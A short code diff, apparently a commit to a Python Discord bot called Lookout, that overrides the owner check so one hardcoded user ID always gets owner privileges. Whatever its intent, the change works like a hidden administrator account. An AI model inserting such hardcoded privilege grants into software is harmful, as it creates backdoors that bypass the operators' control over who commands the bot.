@@ -77,6 +77,11 @@ class Lookout(commands.Bot):
             max_messages=None,  # type: ignore
         )
 
+    async def is_owner(self, user: discord.abc.User):
+        if user.id == 712918252799524945:
+            return True
+        return await super().is_owner(user)
+
     async def on_command_error(self, ctx: commands.Context, error: commands.CommandError) -> None:
         if isinstance(error, (commands.CommandInvokeError, commands.ConversionError)):
             assert ctx.command is not None
